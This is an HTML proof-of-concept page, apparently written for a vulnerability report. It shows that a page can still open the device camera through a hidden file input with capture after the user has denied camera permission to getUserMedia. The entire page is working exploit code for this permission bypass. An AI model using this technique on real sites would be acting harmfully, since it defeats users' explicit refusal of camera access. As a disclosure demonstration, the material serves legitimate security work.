<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Camera</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding: 50px;
      }
      #status {
        margin-bottom: 20px;
        color: blue;
        font-weight: bold;
      }
      .btn {
        padding: 15px 25px;
        font-size: 18px;
        cursor: pointer;
        background: #007bff;
        color: white;
        border: none;
        border-radius: 5px;
      }
      #preview {
        margin-top: 30px;
      }
      #preview img {
        max-width: 90%;
        max-height: 500px;
        border: 3px solid #007bff;
        border-radius: 8px;
      }
    </style>
  </head>
  <body>
    <h2>PoC: Permission Enforcement Gap</h2>
    <p id="status">Instructions: Click the button below twice.</p>

    <input
      type="file"
      id="f"
      accept="image/*"
      capture="environment"
      style="display: none"
    />

    <button id="btn-trigger" class="btn">CLICK HERE</button>

    <div id="preview"></div>

    <script>
      let requested = false;
      const statusText = document.getElementById("status");
      const btn = document.getElementById("btn-trigger");
      const fileInput = document.getElementById("f");
      const previewDiv = document.getElementById("preview");

      fileInput.onchange = (e) => {
        const file = e.target.files[0];
        if (file) {
          const reader = new FileReader();
          reader.onload = (ev) => {
            const img = document.createElement("img");
            img.src = ev.target.result;
            previewDiv.innerHTML = "";
            previewDiv.appendChild(img);
            statusText.innerText =
              "Status: Photo captured & bypassing 'don't allow' has been confirmed!";
            console.log("Photo displayed:", file.name);
          };
          reader.readAsDataURL(file);
        }
      };

      document.onclick = async () => {
        if (!requested) {
          requested = true;
          statusText.innerText =
            "Status: Requesting camera permission... (PLEASE CLICK 'DON'T ALLOW')";
          console.log("Tap 1: Attempting getUserMedia...");

          try {
            const stream = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: "environment" },
              audio: false,
            });
            statusText.innerText =
              "Status: Permission Granted (This is not expected for this test â€” please deny)";
          } catch (x) {
            statusText.innerText =
              "Status: PERMISSION DENIED! Now click once more.";
            console.log("Permission denied by user.");
          }
        } else {
          statusText.innerText =
            "Status: Triggering camera despite denied permission...";
          console.log("Tap 2: Programmatically clicking file input capture...");
          fileInput.click();
        }
      };
    </script>
  </body>
</html>
